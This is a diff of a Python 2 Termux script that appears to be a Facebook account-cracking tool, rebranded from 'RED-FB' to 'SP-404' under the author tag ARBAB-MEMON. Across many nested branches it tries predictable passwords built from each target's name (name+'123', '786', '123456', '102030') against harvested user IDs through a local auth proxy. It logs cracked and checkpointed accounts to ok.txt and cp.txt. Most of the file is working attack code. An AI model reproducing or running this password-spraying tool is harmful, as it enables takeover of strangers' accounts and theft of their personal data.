@@ -6,7 +6,7 @@ try:
     from multiprocessing.pool import ThreadPool
 except ImportError:
     os.system("pip2 install requests")
-    os.system("python2 index.py")
+    os.system("python2 sp-404.py")
 os.system("clear")
 """
 try:
@@ -22,17 +22,17 @@ if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
     os.system("apt update && apt install nodejs -y")
 from requests.exceptions import ConnectionError
 os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/RED-FB/MEMON/node_modules/bytes/index.js"):
+if not os.path.isfile("/data/data/com.termux/files/home/SP-404/...../node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
-    os.system("cd MEMON && npm install")
-    os.system("cd MEMON && node index.js &")
+    os.system("cd ..... && npm install")
+    os.system("cd ..... && node index.js &")
     os.system("clear")
     time.sleep(10)
-elif os.path.isfile("/data/data/com.termux/files/home/RED-FB/MEMON/node_modules/bytes/index.js"):
+elif os.path.isfile("/data/data/com.termux/files/home/SP-404/...../node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
-    os.system("cd MEMON && node index.js &")
+    os.system("cd ..... && node index.js &")
     os.system("clear")
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
@@ -41,18 +41,18 @@ reload(sys)
 sys.setdefaultencoding("utf-8")
 c = "\033[1;92m"
 c2 = "\033[0;91m"
-c3 = "\033[1;93m"
+c3 = "\033[1;97m"
 #MyLogo
 logo = """
 
 \t###### #####  #####  ###### #####
 \t#    # #   #  #    # #    # #    #
 \t#    # ####   #    # #    # #    # 
-\t###### # #    #####  ###### #####    
+\t###### #  #   #####  ###### #####    
 \t#    # #   #  #    # #    # #    #        
 \t#    # #    # #####  #    # #####   
 \t----------------------------------
-\t YOU CANNOT DECOMPILE IT BROTHER
+\t NAAM TO SUNA HI HOGA MERI JAAN
 -----------------------------------------------
 
 ➣ Author   : ARBAB-MEMON
@@ -171,7 +171,7 @@ def login_fb():
 	uid=id2.replace(')','')
 	pwd = raw_input(" Password   : ")
 	print("")
-	data=requests.get('http://localhost:8080/auth?id='+uid+'&pass='+pwd, headers=header).text
+	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
 	q = json.loads(data)
 	if "loc" in q:
 		hamza = open(".fb_token.txt","w")
@@ -748,119 +748,119 @@ def l_menu_select():
 		uid,name=user.split("|")
 		try:
 			pass1 = name+"123"
-			data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass1, headers=header).text
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
+				print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("[CP] "+uid+" | "+pass1)
+					print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
 					cp = open("cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
 				else:
 					pass2 = name+"1234"
-					data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass2, headers=header).text
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
+						print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("[CP] "+uid+" | "+pass2)
+							print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
 						else:
 							pass3 = name+"12345"
-							data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass3, headers=header).text
+							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
+								print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("[CP] "+uid+" | "+pass3)
+									print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
 								else:
 									pass4 = name+"786"
-									data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass4, headers=header).text
+									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
+										print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("[CP] "+uid+" | "+pass4)
+											print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.apppend(uid+pass4)
 										else:
 											pass5 = "234567"
-											data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass5, headers=header).text
+											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
+												print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("[CP] "+uid+" | "+pass5)
+													print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
 												else:
 													pass6 = "123456"
-													data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass6).text
+													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
+														print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("[CP] "+uid+" | "+pass6)
+															print '\x1b[1;92mCHECKPOINT💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
 														else:
 															pass7 = "102030"
-															data = requests.get("http://localhost:8080/auth?id="+uid+"&pass="+pass7, headers=header).text
+															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m[OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
+																print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("[CP] "+uid+" | "+pass7)
+																	print '\x1b[1;92mCHECKPOINT\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
 																	cp = open("cp.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -883,3 +883,4 @@ def l_menu_select():
 	l_menu()
 if __name__ == '__main__':
     start()
+####Arbab
